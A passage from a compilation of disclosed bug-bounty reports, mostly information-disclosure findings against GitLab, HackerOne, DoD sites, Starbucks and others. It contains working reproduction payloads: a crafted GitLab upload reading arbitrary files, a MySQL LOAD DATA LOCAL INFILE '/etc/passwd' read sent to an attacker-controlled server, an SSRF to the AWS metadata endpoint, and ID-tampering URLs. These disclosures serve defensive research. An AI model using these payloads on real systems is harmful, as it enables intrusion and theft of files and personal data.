1. create a test file on the gitlab server: `echo hello > /tmp/ggg;`
1. create a dummy file on the attackers server `echo unused > /tmp/lala.txt`
1. Upload a wiki file using the crafted params
        ```bash
$ curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'`
{"file_name":"ggg","file_path":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","branch":"master","link":{"url":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","markdown":"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)"}}
        ```
1. paste the markdown into the wiki page and download the file

### Impact
* read known files in `::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')`
* read unknown inflight files by using the symlinks in `/proc/PID/fd/XX` belonging to other users.

### Examples
* https://gitlab.com/vakzz-h1/workhorse-bypass/-/wikis/home
The above was uploaded using `file.path=/opt/gitlab/embedded/service/gitlab-rails/public/422.html` to verify.

### What is the current *bug* behavior?
An attacker can specify `file.*` params and have gitlab believe they are valid and signed 

### What is the expected *correct* behavior?
Only params from the workhorse should be valid

### Output of checks
#### Results of GitLab environment info
```
System information
System:     Ubuntu 18.04
Proxy:      no
Current User:   git
Using RVM:  no
Ruby Version:   2.6.5p114
Gem Version:    2.7.10
Bundler Version:1.17.3
Rake Version:   12.3.3
Redis Version:  5.0.7
Git Version:    2.24.1
Sidekiq Version:5.2.7
Go Version: unknown

GitLab information
Version:    12.9.3-ee
Revision:   7c13691fb8e
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: 10.12
URL:        http://gitlab-vm.local
HTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:  git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:  no
Geo:        no
Using LDAP: no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:    12.0.0
Repository storage paths:
- default:  /var/opt/gitlab/git-data/repositories
GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
Git:        /opt/gitlab/embedded/bin/git
```

## Impact

* read known files in `::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')`
* read unknown inflight files by using the symlinks in `/proc/PID/fd/XX` belonging to other users.

---

### [Customer private program can disclose email any users through invited via username](https://hackerone.com/reports/807448)

- **Report ID:** `807448`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @haxta4ok00
- **Bounty:** 7500 usd
- **Disclosed:** 2020-05-15T17:24:34.443Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hey team,This bug could have been used by my calculations a long time ago
## Steps To Reproduce:
1)Go to https://hackerone.com/hackerone_h1p_bbp3/launch
2)Take invite via username
3)Input username , send invite
3.1)When an invite is created, we get a token
4)Now Go use GraphQL query

https://hackerone.com/graphql?

`{"query": "query {team(handle:\\"hackerone_h1p_bbp3\\"){_id,handle,soft_launch_invitations{total_count,nodes{... on InvitationsSoftLaunch{token}}}}}"}`

Answer:

`{"data":{"team":{"_id":"47388","handle":"hackerone_h1p_bbp3","soft_launch_invitations":{"total_count":5,"nodes":[{"token":"████████"},{"token":"███"},{"token":"████"},{"token":"██████"},{"token":"████████"}]}}}}`
████


5)Now check .json - █████████

`{"token":"████████","type":"Invitations::SoftLaunch","auth_option":"has-no-access","email":"████@managed.hackerone.com","status":"valid","expires_at":"2020-03-06T21:33:31.689Z","recipient":{"username":"zebra","profile_picture":"███","url":"https://hackerone.com/zebra"},"open_soft_launch_invitations_count":0}`


`"email":"██████████@managed.hackerone.com"`
██████
6)You need to do this immediately before the user accepts or rejects our request for an invite

Thanks, @haxta4ok00

## Impact

Disclosed email

---

### [Username&password is Disclosure in readme file in [https://█████████]](https://hackerone.com/reports/804980)

- **Report ID:** `804980`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0xsnowmn
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T17:50:44.890Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Username&password is Disclosure for login into dashboard in readme file in [https://███]
**Description:**
* open [this](https://██████████/README.md) and u will see the username and password in the file

## Impact

* Disclosure Sensitive Information "username&password"

---

### [Admin Login Credential Leak for DoD Gitlab EE instance](https://hackerone.com/reports/799898)

- **Report ID:** `799898`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @daehee
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T17:44:38.871Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

A DoD employee/contractor exposed the ███ password in a GitHub repository ([█████████](https://█████)) leading to full ███ access in a DoD DISA-associated private Gitlab EE instance (`███`).

## Description

The IP address `████` recently hosted the subdomain `█████████` (as of 2019-09-23). 

██████

Now `port 80` points to a private Gitlab Enterprise Edition instance. The current hostname is `██████` and the TLS certificate points to `████`.

```
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Tue, 18 Feb 2020 12:30:01 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
Location: https://████:443/
```

Going to `https://██████████/explore` shows no projects, groups, or snippets exposed publicly.

However, a Github search for `█████████` as displayed in the TLS certificate leads to a few interesting code commits. This commit  ([████████](https://██████████)) for a project titled "██████ (█████)" contains █████ credentials for a particular Jenkins instance.

```
- name: JENKINS_OC_USER
value: ███████
- name: JENKINS_OC_PASSWD
value: ████████
```

The default Gitlab EE username `████████`  with the password `██████`, as shown in GitHub commit, gains full █████████istrative access.

After confirming valid login, I made no further attempts to escalate privileges on the machine, nor attempted deeper access into the private contents of this Gitlab EE instance. 

## Suggested Mitigation/Remediation Actions

In addition to updating security credentials to this Github commit, you might want to review any other DoD applications that are possibly using the same password.

### Other

In addition to updating ██████ credentials for this Gitlab EE application, you might want to review any other DoD applications that are possibly using the same password.

## Impact

Exploited by a malicious actor, the security impact of this leak could include:

* Leverage valid credential to gain access to other DoD applications
* View sensitive source code in private repositories
* Access potential secret tokens, API keys, passwords contained in source code
* Change user information
* Access other user accounts
* Create new unauthorized repositories
* Host malicious content

---

### [Publicly accessible Grafana install allows pivoting to Prometheus datasource](https://hackerone.com/reports/764731)

- **Report ID:** `764731`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @gnarlygoat
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T17:11:26.153Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A publicly accessible Grafana install exposes semi sensitive Dashboards. This also exposes the Prometheus proxied datasources which allow direct queries to a Prometheus instance which reveals sensitive data an opens the instance up to potential DoS via crafted requests.

**Description:**

## Impact
Medium-Low

## Step-by-step Reproduction Instructions

1. Grafana instance - https://████████/stats/
2. Example semi sensitive dashboard: https://████████/stats/d/███/
3. This dashboard reveals an unrestricted Prometheus proxy API at https://███/stats/api/datasources/proxy/1/api/v1/
4. This API can be queried in many ways to include resource intensive queries which could result in a DoS. An example of exposed datasets:
https://██████/stats/api/datasources/proxy/1/api/v1/label/__name__/values. A query crafted to require high resource usage would result in a denial of service.
5. This can reveal much more sensitive data as well such as internal ip addresess assigned to interfaces https://████/stats/api/datasources/proxy/1/api/v1/query?query=node_network_address_assign_type

 or

`curl -s 'https://██████/stats/api/datasources/proxy/1/api/v1/query?query=node_network_address_assign_type' |     python2 -c "import sys, json; print json.load(sys.stdin)['data']['result'][0]"`
 (Ip addresses are in decimal)

## Product, Version, and Configuration (If applicable)
 Grafana v6.4.4 
## Suggested Mitigation/Remediation Actions
Implement controls to disallow public access

## Impact

Denial of Service
Utilize exposed network and device data for network reconnaissance

---

### [PII of Users Disclosure using "/members/invite/" endpoint](https://hackerone.com/reports/787955)

- **Report ID:** `787955`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Lab45
- **Reporter:** @bonikia97
- **Bounty:** - usd
- **Disclosed:** 2020-04-13T13:11:44.714Z
- **CVE(s):** -

**Vulnerability Information:**

Hello!

I found PII Disclosue at https://connect.topcoder.com/projects/

#Steps to Reproduce.

1) Go to https://connect.topcoder.com/projects
2) Select an existing project, or create a new one.
3) Select the "Manage Invitations" option. (on the left sidebar).
4) Enter the Username/Email of the user you want to add.
5) Intercept two Request (GET & POST) with BurpSuite, and send this to Repeater.
6) With Requests: 

6.1)With GET Request: See that it is similar to a query in the database, you can manipulate them to get more information. Use this to get the ID of any user.

6.2)With POST Request: Put any userIds, and send the Request.

7) Look the Response, the email and more information of users can be seen.
 
Regards!

PoC: 
1) "PII Email TopCoder" Video.
2)  Image called "Manipulated Email Request",  In which you will see the manipulated request to get all users with email-domain "@wearehackerone.com".
(With this you could obtain the IDs of any user and any email domain by following the steps of the PoC in video.)


Regards!

## Impact

If the attacker wanted, he could see the information of the Admins, or any Member of TopCoder. It could collect internal information from the company and continue to feed its attack vectors.
If you check other endpoints, nowhere is the user's email shown.

---

### [China – Limited Partner PII Regarding Work Scheduling via Unauthenticated API Endpoint](https://hackerone.com/reports/659248)

- **Report ID:** `659248`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Starbucks
- **Reporter:** @0xpatrik
- **Bounty:** - usd
- **Disclosed:** 2020-04-01T16:48:22.125Z
- **CVE(s):** -

**Summary (team):**

0xpatrik discovered an unauthenticated API endpoint that allowed retrieval of specified work leave dates of designated Starbucks employees in China.
@0xpatrik — thank you for reporting the original vulnerability and for confirming the resolution.

---

### [sdrc.starbucks.com - Information Disclosure via unsecured attachment directory](https://hackerone.com/reports/769016)

- **Report ID:** `769016`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Starbucks
- **Reporter:** @l00ph0le
- **Bounty:** - usd
- **Disclosed:** 2020-02-26T22:55:06.019Z
- **CVE(s):** -

**Summary (team):**

l00ph0le submitted a valid high severity XSS vulnerability report for sdrc.starbucks.com. After Starbucks confirmed this vulnerability and advised this asset was not in scope; l00ph0le performed additional analysis and research to uncover an unsecured attachment directory which elevated this to a critical report. l00ph0le was subsequently awarded a critical bounty payout in accordance with the updated severity and scope.

@l00ph0le — thank you for reporting the original vulnerability, the additional information and for confirming the resolution.

---

### [[Partial] SSN & [PII] exposed through iPERMs Presentation Slide.](https://hackerone.com/reports/719631)

- **Report ID:** `719631`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @try__harder
- **Bounty:** - usd
- **Disclosed:** 2019-12-02T20:03:29.777Z
- **CVE(s):** -

**Vulnerability Information:**

Hello @deptofdefense, when performing reconnaissance, I came across a presentation slide that displayed live data since the data is blocked out & is formatted with `XXX-XX` with the last 4 digits.

The exposed data contains the following: `UPC, Division/Brigade, Rank, Soldier Name, Last 4 digits of SSN, FRR (Financial Record Reviews), PRR (Personal Record Reviews).`

Here are a few exposed users:
████████, XXX-XX-█████████
████████, XXX-XX-█████

The link that is hosting the Presentation Slide: `https://████████/wp-content/uploads/2017/12/Introduction-to-iPERMS-Slides.pptx` & on Slide 25, there is the exposed data.

The remediation/mitigation for this security flaw is the removal of the data/file & I have set the severity to `Critical` as it is exposing sensitive [PII] which could lead to a data breach.

## Impact

The sensitive information can be used to authenticate through various web-portals especially with the last 4 digits & full name with rank.

---

### [Information disclousure by clicking on the link shown in http://████████/](https://hackerone.com/reports/708019)

- **Report ID:** `708019`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @pirateducky
- **Bounty:** - usd
- **Disclosed:** 2019-12-02T20:02:16.883Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

Looking at some subdomains using `aquatone` I noticed ` http://█████/` I clicked it and then started navigating the page, if I go to this link: `https://█████████/██████████wireframes/admin/round12/tsp_0-awarded.html` it is completely valid and shows some information that I'm unsure it should be online, it also shows me logged in as a user `Pat` and `Janelle`

## Impact

Information disclosure

## Step-by-step Reproduction Instructions

1. Navigate to ` http://████/`
2. Click `Main Index Page` 
3. Click ` Office & TSP` or use this link `https://███████/██████index-admin.html#` 

## Suggested Mitigation/Remediation Actions

If this is sensitive data - it should be restricted to only people who need to access it no the whole internet, there are certain action where it prompts for a password.

Thanks - 

If this is somehow *supposed* to be up I would like to self-close as to not affect my current profile

## Impact

Information disclosure, possibly a dev environment left open but unsure.

---

### [PII leakage due to scrceenshot of health records](https://hackerone.com/reports/693933)

- **Report ID:** `693933`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-12-02T20:01:41.364Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Document shows a screenshot of a medical record for a soldier 
**Description:**
One of the slides describes the CIV# and PAD DSN# along with some information relating to the soldier such as their name, the information appears to be old but could be still be an issue if they're in service
## Impact
High? maybe critical? Unsure on impact 
## Step-by-step Reproduction Instructions
Check slide 13 specifically but there's other slides that are suspect too
https://███████/wp-content/uploads/2018/12/HR_TECH_WOBC_Perform_eMILPO_Functions_eMILPO_Brief.pptx

## Product, Version, and Configuration (If applicable)
N/A
## Suggested Mitigation/Remediation Actions
Purge Doc

## Impact

An attacker could assume soldier identities and learn more about possible health information related to them

---

### [LFI through the MySQL connection](https://hackerone.com/reports/719875)

- **Report ID:** `719875`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Infogram
- **Reporter:** @muon4
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T12:33:57.212Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team!

I've found a way to read Infogram's server local files through the MySQL connection.
The problem is that you're using the `LOAD DATA LOCAL` feature with your MySQL client. This how an attacker can easily send server's local files to her/his database.

I've successfully readed the `/etc/passwd` and `/etc/hosts` files from your server.

### Steps to reproduce
- Login 
- Make a new infographic or navigate to the existing one
- Now add new MySQL connection under `data` section
- Set the value of the SQL SELECT statement to the following:

```
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE asd.asd
FIELDS TERMINATED BY "\n"
```

- Fill other necessary information (IP address, port etc..)
- Now setup/install the "evil" MySQL server with the database/table called `asd` and other needed information. Point your MySQL connection from infogram app to this server.
- Listen network traffic of the "evil" MySQL server. If you are using tcpdump you can do wireshark readable file with this command `tcpdump -s 0 port 3306 -i eth0 -w infogramsteal.pcap`
- Now click `Create` in the infogram app
- Once you get an error message at infogram app stop the tcpdump and open it with wireshark

In wireshark/pcap you can see some main points. First is the **login request** where you can see that `LOAD DATA LOCAL` is set to the value `1` which is basicly same than `true`: 
{F614430}
Also, you can see the **Request Command Unknown** which basicly contains the value of the file `/etc/passwd`:
{F614431}

Disable the `LOAD DATA LOCAL` feature if possible.

If you need any information please let me know.

Cheers!

## Impact

Reading local files from the server

---

### [Access MoPub Reports Data even after Company removed you from their MoPub Account.](https://hackerone.com/reports/399174)

- **Report ID:** `399174`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** X / xAI
- **Reporter:** @suyog
- **Bounty:** - usd
- **Disclosed:** 2019-11-05T18:08:15.483Z
- **CVE(s):** -

**Vulnerability Information:**

##Description + Attacking approach

**API Workflow** :

- The MoPub Reporting API supports two separate CSV outputs where publishers can retrieve inventory or campaign performance data.

- Publishers can retrieve daily reports via making a GET request using the request parameters.

- This URL will return a 302 redirect response. The link to download the report will be returned in the response location header.

-----

**How you grab Report data even after company removed you**

- If Publisher/Company invite you for their MoPub Account with any permissions & Roles.
 ("administrators or Members" - it doesn't matter, which permission company gives you while invitation)

- After accept the invitation you have access to make all changes to the company account. 

-----

**Attacking approach start from here**

- In order to retrieve data, the API must first be enabled for company account.
- So, you can Enable data access through API (just click on checkbox in the Reports page of the MoPub UI.)
or it might be already enabled by publisher.
- Note down the "Reporting API access details". [i.e. API key, Inventory report ID, Campaign report ID]
- Also Note the Report ID of each MoPub Report present inside the Company Account.

**!!!**

- Now, the publisher/company doesn't want you with their MoPub account and they removed you from their Manage User settings.
- But they forgot to Reset API key.
- Now, you don't have any access of company account. 

> NOTE! **You have the "Reporting API access details (which you noted)".**

-----

**Access the Reporting API :**

- GET request using the request parameters.

[report_key=[individual_report_id ; inventory_report_id ; campaign_report_id]
api_key=[API_KEY]
date=Date of the report. Format YYYY-MM-DD]
https://app.mopub.com/reports/custom/api/download_report?report_key=[REP_KEY]&api_key=[API_KEY]&date=[YYYY-MM-DD]

- Sample Request:

██████████

-----

##Remediation :

1. API key must be auto-reset after the user removed from company.
2. **(for 2nd condition in impact)** Once the Data access is disabled, user should not be able to access reports data via API.


.


**Thank you : )**

## Impact

- Attacker(removed user) able to access Organization Current as well as in Future created MoPub reports in 2 conditions :

1. If API key is not reset and "data access through API" checkbox is enabled 
2. If API key is not reset and "data access through API" checkbox is disabled.

---

### [Information Disclosure (can access all ███s) within ███████ view █████████ Portal](https://hackerone.com/reports/484377)

- **Report ID:** `484377`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @archang31
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:58:30.363Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** Once ███████ authenticated (I did not mess around to see if I could reproduce without authentication), any user can view any ██████████ simply by changing the offasgid HTTP GET parameter value in the ██████ view █████████ portal link.

**Description:**
I was looking through my previous ███████s and noticed I was receiving urls like https://█████████/portal/viewrfo.aspx?offasgid=MjAwODAyMTg1Nw== . This url is clearly expecting a HTTP GET parameter offasgid with some base64 encoded value. Decoding this value, you get 2008021857 . The █████ in question was my first █████ from February 2008. From testing several IDs, I determined the format is {year}{██████████ #} so 2008, ████████ # 021857.  I simply incremented this value to 2008021858, base64 encoded this value, and browsed to https://███/portal/viewrfo.aspx?offasgid=MjAwODAyMTg1Ng==  . Here, I was able to see ███████.  I also tested the next value ( https://███/portal/viewrfo.aspx?offasgid=MjAwODAyMTg1NQ== ) and got █████. Finally, I opened a new private browser window (so no cookies) and browsed directly to that last link. I had to reauthenticate, but I then was able to directly assess ██████████. At this point, I stopped interacting with the website to submit this vulnerability. 

NOTE: I did not save any record of these ███████s outside except the single attached screenshot.
NOTE2: I tried a couple more values during this write-up to better understand the ID. I initially thought the 02 from 2008021858 was the month {year}{month}{id} but its just {year}{id}. I used 2018000001 and ended up with an ████████ from 20171001 (the very first day of the 2018 fiscal year). I also tested a couple IDs to see how far back the data goes. I used 1999000001 to pull an ██████ from 19980327. I believe this is the very first █████ in the system. I tried 1997000001 as well, and it simply returned a blank ████ (i.e. the ID does not exist).

## Impact
In a relatively simple and predictable manner (due to the sequential IDs), any user with access to █████ can incrementally view every ███ issued by ████████ dating back to 1998. This data includes SSN last 4, EFMP information, branch, and assignment information. From this data, one can extract all sorts of information about the U.S. █████████ personnel including total ██████████ strength, ████ strength by branch, assignment history, strength by base, etc.

## Step-by-step Reproduction Instructions

1. Log into ██████████ (https://███.██████████.███████.mil/)
2. Browse to any █████████ you want to view like https://████/portal/viewrfo.aspx?offasgid=MjAxOTAxMDg2NQ== if you want to view my most recent ███.
3. Modify offasgid value as desired to view any other ███████ (they seem to be incrementing IDs by year)

## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions
First, the offasgid needs to be random and not a predictable value. Secondly, there needs to be some access check based on the provided cookie (user credentials) to ensure that user should be able to access that record.

## Impact

In a relatively simple and predictable manner (due to the sequential IDs), any user with access to ████ can incrementally view every ███████ issued by ██████ dating back to 1998. This data includes SSN last 4, EFMP information, branch, and assignment information. From this data, one can extract all sorts of information about U.S. ████ personnel including total ███ strength, ████████ strength by branch, assignment history, strength by base, etc.

**Summary (team):**

An information disclosure vulnerability was discovered on a DoD system.

---

### [Publicly accessible Order confirmations leaking User Emails on ███](https://hackerone.com/reports/323992)

- **Report ID:** `323992`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:55:41.949Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I noticed that a user's order confirmation was publicly accessible leaking email information
**Description:**
An attacker can gleam sensitive information that is stored in the order confirmation file
## Impact
Medium
## Step-by-step Reproduction Instructions

https://██████████/BinaryHandler.ashx?RecordID=MZtO1v39KiFWXykCvQEcOw%3D%3D

## Product, Version, and Configuration (If applicable)
N/A
## Suggested Mitigation/Remediation Actions
Scrub user data

## Impact

Attackers can steal PII

---

### [SSRF on █████████ Allowing internal server data access](https://hackerone.com/reports/326040)

- **Report ID:** `326040`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:54:58.082Z
- **CVE(s):** CVE-2017-9506

**Vulnerability Information:**

**Summary:**
An end point on ██████ allows an internal access to the network thus revealing sensitive data and allowing internal tunneling 
**Description:**
OAuth Plugin allows you to provide a url that gives a snap shot of the web page. We can pass internal URLS and conduct SSRF.
## Impact
Critical
## Step-by-step Reproduction Instructions
https://███████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/hostname
We can see the follow data 
ip-172-31-12-254.█████████.compute.internal
https://████████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-ipv4
███████

## Product, Version, and Configuration (If applicable)
Jira 
## Suggested Mitigation/Remediation Actions
Update to recent version

## Impact

An attacker can tunnel into internal networks and access sensitive internal data such as AWS meta data information.

The hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Can internal services be reached bypassing network access control?**
Yes

**What internal services were accessible?**
AWS Bucket  Meta data

**Security Impact**
CVE-2017-9506 - The IconUriServlet of the Atlassian OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4 allows remote attackers to access the content of internal network resources and/or perform an XSS attack via Server Side Request Forgery (SSRF).

**Summary (researcher):**

I discovered that due to an outdated atlassian software instance, I was able to exploit an SSRF vulnerability in confluence and was able to perform several actions such as bypass any firewall/protection solutions, was able to perform XSPA through assessing the response times for ports, access Internal DoD Servers and internal services.

I discuss the vulnerabilities exploited in my write which you can find here, https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a

---

### [PII leakage due to caching of Order/Contract ID's on █████████](https://hackerone.com/reports/374007)

- **Report ID:** `374007`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:48:35.562Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I was able to discover contract numbers which leak out user names/emails/phone numbers nd other sensitive information. I took the time to assure that these contract id's wouldn't/shouldn't be easy guessable or known.
**Description:**
I discovered through google search query that I was able to access several Order/contract id's that revealed a trove of sensitive data that shouldn't of been easily accessible or cached by google search results.
## Impact
High
## Step-by-step Reproduction Instructions
https://███/CMT_View/CMT_View_List.cfm?StartRow=31&OrderBy=Email&OrderByCol=4&Sort=DESC&SearchType=CONTRACT&ContractNumber=███&Cage=

https://██████████/CMT_View/CMT_View_List.cfm?OrderBy=FormatedRoleCode&OrderByCol=2&StartRow=1&Sort=ASC&SearchType=CONTRACT&ContractNumber=██████&Cage=

███████, ██████ D.	ACO	1102	██████████.█████@█████████	█████████
████, ████ J.	CA	1102	███████.███@█████	█████
████, ███ M.	DRPM	0801	████.████████@██████	██████
██████,███████ R.	IS	1150	████.█████@████	██████
████, ███████ R.	PA	1103	████.████@█████████	████████
███████, ██████████ S.	PT	1106	████.████████@███	██████
████████, ███ E.	QAR	1910	██████████.████████@████████	█████████
██████████, ████ M.	SUP	0344	█████.█████@█████	██████
████████,███ R.	SUP	1150	██████████.███@███████	████
█████, ██████ D.	SUP	1150	██████.████@█████████	█████████

Additionally verified that these aren't test data entries by googling one of the emails and resulting found the owner's linkedin account.
## Product, Version, and Configuration (If applicable)
N/A
## Suggested Mitigation/Remediation Actions

## Impact

An attacker can gather high priority PII.

---

### [██████ Authenticated User Data Disclosure](https://hackerone.com/reports/587214)

- **Report ID:** `587214`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @deputy
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:16:11.942Z
- **CVE(s):** -

**Vulnerability Information:**

##Background##
The Air Force’s ███ application is exposing members’ personal information to other users with access to the applocaton. We’ve identified two specific issues, but there may be other similar problems in the same vein as the ones described here. The underlying problem appears to be that users are not prevented from visiting the web addresses (URLs) that return others’ data.
███████ Home Page: https://███/█████
Version Number: 1.85.10

###Caveats###
1. Users must first be able to login to ██████ in order to exercise these issues. Members’ data is not being exposed to just any user on the web, as far as we know
2. All screenshots containing member data were taken with the consent of the member. Personal information has been redacted and replaced with placeholders (Person #1 and Person #2). Person #1 is the logged in user. Person #2 is another user whose data is being accessed by Person #1, with Person #2’s consent.

##Issue #1: Exposure of Members’ Vulnerable Mover List (VML) Status Information##
BLUF: Talent Marketplace exposes members’ bid/preference information along with the CC’s ranking and comments sent to the Air Force Personnel Center to any logged on user in the VML cycle.
When you visit the “My VML Status” page you are presented by the position preferences you’ve chosen, the bids you’ve received, your Losing Commander’s comments/ranking, and some other information about your VML cycle. See ███████

In order to present you with this information, your browser makes a request in the background for the information it uses to populate the webpage. This request is easily viewable using developer tools present in most modern browsers.

████████ shows the raw data sent to your browser in response to the request it sends. You can see all the preferences you put in, information on the bids you’ve received, and your Losing Commander’s ranking and comments for the member. Notice the redacted “personId” labeled “ID #1” at the very top of the screenshot. This is a unique ID tied to Person #1 (you). If you replace this ID with that of Person #2, and make the request again, the server will send you all the same information for Person #2, even though you (not Person #2) are making the request.

Taken to the nth degree, any user could iterate through all “personId” values to gather all bid/preference/CC comments for everyone in a VML cycle, but there’s also a way to determine the “personId” of any arbitrary user.

###Finding a Member’s PersonID###
On the “My Profile” page, there’s a button you can click to change your military supervisor. When you begin typing someone’s name in the dialog box, your browser makes another background request to search the server’s database for users with that name. Contained in the response is the user’s “personId.” This is not necessarily a problem in and of itself, but it can be used to determine the Person ID of the member whose VML Status you wish to see. See ██████████.

###Key URLs###
Note: You must first log in to the ████ application before visiting these URLs
**Access Arbitrary Member’s VML Cycle Info By Person ID (Replace XXXXXX with Person ID)**
https://█████/███/IndividualReport/GetVmlEligibleBidInfoData?personId=XXXXXX&vmlCycleId=4
**Determine Arbitrary Member’s Person ID By Name (Replace XXXXXX with Name)**
https://███/██████/SearchPersonUser/FindPerson?SearchTerm=XXXXXX

##Issue #2: Exposure of Other Members’ Career Brief##
BLUF: ███ exposes other members’ career brief to any logged on user.
When you view the “My Boards” section of ████, there’s a link that you can visit to see a PDF of your career brief as seen by the Board. The URL for this PDF uses another unique ID (not the same as PersonID from Issue #1) to determine whose career brief you see. If you replace your unique ID with someone else’s in the URL, you can see their Career Brief, which contains Privacy Act data. See ███.

###Finding a Member’s “Encrypted ID”###
The Career Brief page uses an “Encrypted ID,” to identify a member. It is much longer than a “Person ID,” making it difficult to just iterate over all possible IDs, but there is a way for you to find the Encrypted ID of a particular user if they have a mentor profile. When you view the members’ mentor profile in the “Mentoring Connections” section of ██████████, the URL contains their Encrypted ID. If you copy and paste that ID and replace your ID with theirs in the URL for your career brief, you will see their career brief, which is clearly marked as Privacy Act Data, and should not be visible to any member. See ████

###Key URLs###
Note: You must first log in to the ████ application before visiting this URL
**Access Arbitrary Members’ Career Brief By Encrypted ID (Replace XXXXXX with Encrypted ID)**
https://███████/███/Dashboard/CareerBrief/PrintOfficerCareerBrief?person=XXXXXX

##Suggested Mitigations##
We suggest that █████████ enforce access to user data based on the current logged in user, rather than just the PersonID or Encrypted ID the user presents in the request URL.

It’s likely that there are other API endpoints accessible to the user that have similar issues to the two presented above. We also recommend surveying all API endpoints to ensure they are properly validating that the logged in user is only requesting their own information rather than that of any other user.

## Impact

Any user logged into USAF ███████ can see data, including Privacy Act data, of other users through the application. The issue does not expose user data to the open Internet, but it does expose it to other legitimate users who should not be able to see it.

---

### [[mena.starbucks.com] Laravel App Log & Configuration Disclosure.](https://hackerone.com/reports/401098)

- **Report ID:** `401098`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Starbucks
- **Reporter:** @bobrov
- **Bounty:** - usd
- **Disclosed:** 2019-09-30T18:38:44.213Z
- **CVE(s):** -

**Summary (team):**

bobrov discovered a misconfiguration in a Laravel instance at mena.starbucks.com, which exposed log files and environment variables containing database management credentials. The logs have been removed, and the instance of Laravel has been disabled.

Thank you @bobrov for finding this misconfiguration and helping to resolve this issue!

---

### [Starbucks China Android app cloud storage service leaks a credential.](https://hackerone.com/reports/440629)

- **Report ID:** `440629`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Starbucks
- **Reporter:** @k3mlol
- **Bounty:** - usd
- **Disclosed:** 2019-09-30T18:32:32.220Z
- **CVE(s):** -

**Summary (team):**

k3mlol found a credential encoded in the Starbucks China mobile application for Android phones, which provided access to a cloud-hosted service that was used to upload information for customer service requests. This credential allowed for read/write access. The credential has since been disabled, and replacement credentials in newer versions of the application are managed differently to avoid their exposure and to restrict access to write-only.

Thank you @k3mlol for submitting a valuable report and your continued assistance as we worked through to the final resolution.

---

### [Github information leaked](https://hackerone.com/reports/676212)

- **Report ID:** `676212`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Semrush
- **Reporter:** @a_l_i_c_e
- **Bounty:** - usd
